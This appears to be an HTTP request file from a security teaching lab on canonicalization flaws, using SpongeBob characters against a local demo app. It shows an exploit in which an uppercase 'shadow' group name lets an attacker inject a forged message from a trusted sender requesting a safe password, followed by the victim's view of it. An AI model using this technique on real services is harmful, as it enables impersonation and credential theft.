@base = http://localhost:8000/ii/normalization-canonicalization/example2

### EXPLOIT: Plankton creates uppercase shadow group with forged message from "Mr. Krabs"
POST {{base}}/groups
Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy
Content-Type: application/json

{
    "name": "STAFF@KRUSTY-KRAB.SEA",
    "users": [{"role": "admin", "user": "plankton@chum-bucket.sea"}],
    "messages": [
        {
            "from": "mr.krabs@krusty-krab.sea",
            "message": "I accidentally deleted the new safe password. SpongeBob, you need to send it to me by the end of the day!"
        }
    ]
}

###

### When SpongeBob accesses his group using lowercase (as normal), he sees Plankton's message
GET {{base}}/groups/staff@krusty-krab.sea/messages
Authorization: Basic spongebob@krusty-krab.sea:bikinibottom

# Results in message injection:
#
# [
#   {
#     "from": "mr.krabs@krusty-krab.sea",
#     "message": "I accidentally deleted the new safe password. SpongeBob, you need to send it to me by the end of the day!"
#   }
# ]
#
# IMPACT: Plankton successfully injected a social engineering message into the
# Krusty Krab staff group! SpongeBob, being trusting, will likely send the
# safe password directly to Plankton. The fake urgency ("by the end of the day!")
# pressures SpongeBob to act without verifying. Case-insensitive group creation
# combined with case-sensitive message storage allows complete takeover of
# group communications through shadow groups.
